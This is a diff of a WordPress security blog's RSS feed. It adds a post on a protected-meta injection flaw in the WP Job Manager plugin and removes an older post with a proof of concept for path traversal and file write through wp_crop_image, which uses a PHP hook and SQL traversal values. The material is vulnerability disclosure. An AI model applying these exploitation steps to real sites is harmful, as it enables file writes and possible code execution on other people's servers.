@@ -12,7 +12,7 @@
 	<atom:link href="https://wpdeeply.com/category/core/feed/" rel="self" type="application/rss+xml" />
 	<link>http://wpdeeply.com/</link>
 	<description></description>
-	<lastBuildDate>Sun, 09 Aug 2020 14:40:02 +0000</lastBuildDate>
+	<lastBuildDate>Tue, 11 Aug 2020 10:52:16 +0000</lastBuildDate>
 	<language>en-US</language>
 	<sy:updatePeriod>
 	hourly	</sy:updatePeriod>
@@ -20,6 +20,111 @@
 	1	</sy:updateFrequency>
 	<generator>https://wordpress.org/?v=5.4.2</generator>
 	<item>
+		<title>WordPress protected meta via wp job manager</title>
+		<link>https://wpdeeply.com/wordpress-protected-meta-via-wp-job-manager/</link>
+		
+		<dc:creator><![CDATA[root]]></dc:creator>
+		<pubDate>Tue, 11 Aug 2020 10:52:13 +0000</pubDate>
+				<category><![CDATA[core]]></category>
+		<category><![CDATA[plugins]]></category>
+		<category><![CDATA[0day]]></category>
+		<guid isPermaLink="false">https://wpdeeply.com/?p=199</guid>
+
+					<description><![CDATA[Adding slashes or removing them is a thing on WP. Most of the meta functions perform that e.g. they hold that not popular&#160;wp_unslashagainst meta keys and values. This means when input towards&#160;update_metadata&#160;and&#160;add_metadata&#160;isn&#8217;t from the current http requst via some web form e.g. html interface there is possibility for user to insert/update protected meta key into [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<p>Adding slashes or removing them is a thing on WP. Most of the meta functions perform that e.g. they hold that not popular&nbsp;<code>wp_unslash</code>against meta keys and values. This means when input towards&nbsp;<code>update_metadata</code>&nbsp;and&nbsp;<code>add_metadata</code>&nbsp;isn&#8217;t from the current http requst via some web form e.g. html interface there is possibility for user to insert/update protected meta key into post meta database table with simple&nbsp;<code>\_any-value</code>&nbsp;meta key format.</p>
+
+
+
+<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-protected-meta-job-manager.md#eli5-poc"></a>Eli5 PoC</h2>
+
+
+
+<p>WP Job Manager holds functionality that duplicates Job Post and that is avaliable only via Job Dashboard. That is possible via&nbsp;<code>job_manager_duplicate_listing</code>&nbsp;function and there we have the&nbsp;<code>update_post_meta</code>&nbsp;call.</p>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">...
+	// phpcs:ignore WordPress.DB.DirectDatabaseQuery.DirectQuery, WordPress.DB.DirectDatabaseQuery.NoCaching -- Easiest way to retrieve raw meta values without filters.
+	$post_meta = $wpdb->get_results( $wpdb->prepare( "SELECT meta_key, meta_value FROM {$wpdb->postmeta} WHERE post_id=%d", $post_id ) );
+
+	if ( ! empty( $post_meta ) ) {
+		$post_meta = wp_list_pluck( $post_meta, 'meta_value', 'meta_key' );
+
+		$default_duplicate_ignore_keys = [ '_filled', '_featured', '_job_expires', '_job_duration', '_package_id', '_user_package_id' ];
+		$duplicate_ignore_keys         = apply_filters( 'job_manager_duplicate_listing_ignore_keys', $default_duplicate_ignore_keys, true );
+
+		foreach ( $post_meta as $meta_key => $meta_value ) {
+			if ( in_array( $meta_key, $duplicate_ignore_keys, true ) ) {
+				continue;
+			}
+			update_post_meta( $new_post_id, $meta_key, maybe_unserialize( $meta_value ) );
+		}
+	}
+...
+</code></pre>
+
+
+
+<p>Everything is fine, but we must have the possibility to insert meta / custom fields into job post. If we check deeply this functionality then this&nbsp;<code>job_manager_duplicate_listing</code>&nbsp;is called in&nbsp;<code>job_dashboard_handler</code>&nbsp;which is&nbsp;<code>WP_Job_Manager_Shortcodes</code>&nbsp;method. Checking its functionlity we have the following:</p>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">public function job_dashboard_handler() {
+	if (
+		! empty( $_REQUEST['action'] )
+		&amp;&amp; ! empty( $_REQUEST['_wpnonce'] )
+		&amp;&amp; wp_verify_nonce( wp_unslash( $_REQUEST['_wpnonce'] ), 'job_manager_my_job_actions' ) // phpcs:ignore WordPress.Security.ValidatedSanitizedInput.InputNotSanitized -- Nonce should not be modified.
+	) {
+
+		$action = sanitize_title( wp_unslash( $_REQUEST['action'] ) );
+		$job_id = isset( $_REQUEST['job_id'] ) ? absint( $_REQUEST['job_id'] ) : 0;
+
+		try {
+			// Get Job.
+			$job = get_post( $job_id );
+
+			// Check ownership.
+			if ( ! job_manager_user_can_edit_job( $job_id ) ) {
+				throw new Exception( __( 'Invalid ID', 'wp-job-manager' ) );
+			}
+
+			switch ( $action ) {
+...
+case 'duplicate':
+						if ( ! job_manager_get_permalink( 'submit_job_form' ) ) {
+							throw new Exception( __( 'Missing submission page.', 'wp-job-manager' ) );
+						}
+
+						$new_job_id = job_manager_duplicate_listing( $job_id );
+
+</code></pre>
+
+
+
+<p>From here we see that&nbsp;<code>_wpnonce</code>&nbsp;isn&#8217;t tight up with job id, but also from&nbsp;<code>job_manager_user_can_edit_job</code>&nbsp;we see that post type isn&#8217;t checked, but only capability for user to edit the post and that could be any post from any post type. Having in mind previous knowledge presented on wpdeeply and nature of WordPress, this could be considered as high severity issue. Check the facts for RCE <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+
+
+
+<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-protected-meta-job-manager.md#few-facts"></a>Few facts</h2>
+
+
+
+<ul><li>WP Job Manager <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-attachment-api-functions-and-any-post-type/" target="_blank">isn&#8217;t alone</a> and can be attacked via core</li><li>What about WooCommerce before 4.1.0 or <a href="https://wpdeeply.com/woocommerce-mysql-replace-to-rce/" target="_blank" rel="noreferrer noopener">latest WooCommerce</a></li><li>Accessing the blocked meta keys in <code>job_manager_duplicate_listing</code> via this <a href="https://wpdeeply.com/wordpress-core-and-mysql-string-comparison/" target="_blank" rel="noreferrer noopener">technique</a></li></ul>
+
+
+
+<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-protected-meta-job-manager.md#remediation"></a>Remediation</h2>
+
+
+
+<ul><li>Calling <code>wp_slash</code> on input won&#8217;t solve the issue, because <code>update_metadata</code></li><li>:/</li></ul>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
 		<title>WordPress attachment api functions and any post type</title>
 		<link>https://wpdeeply.com/wordpress-attachment-api-functions-and-any-post-type/</link>
 		
@@ -778,94 +883,6 @@ add_action("init", "afd");
 
 
 <ul><li>core files shouldn’t be writable by www-data user</li><li>plugins files shouldn’t be writable by www-data user</li></ul>
-]]></content:encoded>
-					
-		
-		
-			</item>
-		<item>
-		<title>WordPress write image to any directory RCE</title>
-		<link>https://wpdeeply.com/wordpress-write-image-to-any-directory-rce/</link>
-		
-		<dc:creator><![CDATA[root]]></dc:creator>
-		<pubDate>Sun, 12 Jul 2020 20:27:43 +0000</pubDate>
-				<category><![CDATA[core]]></category>
-		<category><![CDATA[0day]]></category>
-		<guid isPermaLink="false">https://wpdeeply.com/?p=131</guid>
-
-					<description><![CDATA[Image cropping in WordPress is sort of unlucky, specially derivation of final image path ( file system or http/s location ), where image will be loaded from the path, but decisions for additional directories creation and final path (no traversal prevention here) are taken from&#160;_wp_attached_file. Those issues are subject for deeper observation and debugging which [&#8230;]]]></description>
-										<content:encoded><![CDATA[
-<hr class="wp-block-separator"/>
-
-
-
-<p>Image cropping in WordPress is sort of unlucky, specially derivation of final image path ( file system or http/s location ), where image will be loaded from the path, but decisions for additional directories creation and final path (no traversal prevention here) are taken from&nbsp;<code>_wp_attached_file</code>. Those issues are subject for deeper observation and debugging which will happen in the very near future, for now we need to get another conclusion.</p>
-
-
-
-<h2 id="eli5-poc">Eli5 PoC</h2>
-
-
-
-<ul><li>Upload image to your local WP and name it wpdeeply.png (in order to be able to use copy paste from here in next steps)</li><li>Get attachment_id (post_id of the image)</li><li>Enable hello.php plugin and add this code at the end of the file</li></ul>
-
-
-
-<pre class="wp-block-code"><code lang="php" class="language-php">function wprcedemo(){
-    
-    //add your attachment_id here - mine is 77
-    $attachment_id = 77;
-    
-    if ( ! function_exists( 'wp_crop_image' ) ) {
-        include ABSPATH . 'wp-admin/includes/image.php';
-    }
-
-    wp_crop_image($attachment_id, 0, 0, 300, 300, 300, 300);
-    
-    exit("good :)");
-}
-
-add_action("init", "wprcedemo");
-
-</code></pre>
-
-
-
-<ul><li>Open mysql administration tool and execute following query</li></ul>
-
-
-
-<pre class="wp-block-code"><code lang="sql" class="language-sql">UPDATE `wp_postmeta` SET `meta_value` =  concat('2020/07/wpdeeply.png#/','boom.png' ) WHERE `wp_postmeta`.`meta_key` = '_wp_attached_file' and `wp_postmeta`.`post_id` = 77
-</code></pre>
-
-
-
-<ul><li>Refresh the home page (good <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /> should be printed) and under&nbsp;<code>2020/07</code>&nbsp;there should be new directory&nbsp;<code>wpdeeply.png#</code></li><li>Open mysql administration tool and execute following query</li></ul>
-
-
-
-<pre class="wp-block-code"><code lang="sql" class="language-sql">UPDATE `wp_postmeta` SET `meta_value` = concat('2020/07/wpdeeply.png#/../../../../themes/twentytwenty/boom.png' ) WHERE `wp_postmeta`.`meta_key` = '_wp_attached_file' and `wp_postmeta`.`post_id` = 77
-</code></pre>
-
-
-
-<ul><li>Refresh the home page (good <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /> should be printed) and under&nbsp;<code>twentytwenty</code>&nbsp;theme should be&nbsp;<code>cropped-boom.png</code>&nbsp;file</li><li><code>_wp_page_template</code>&nbsp;meta_value away from RCE</li></ul>
-
-
-
-<h2 id="few-facts">Few facts</h2>
-
-
-
-<ul><li>WordPress allows files with valid image extension and any content in it (not complete security patches from the past)</li><li>This bug is also part of not complete security patch in the past</li><li><code>_wp_attached_file</code>&nbsp;value becomes holy grail of WordPress security and still there are ways to interfere with it (via core)</li><li>WP core via its site-health push users to install/configure WP in that way so core files are writable by web server</li></ul>
-
-
-
-<h2 id="remediation">Remediation</h2>
-
-
-
-<ul><li>Core files shouldn’t be writable by www-data user</li><li>Theme files shouldn’t be writable by www-data user too</li><li>Turn automatic updates for WP core, plugins, themes OFF</li></ul>
 ]]></content:encoded>
 					
 		
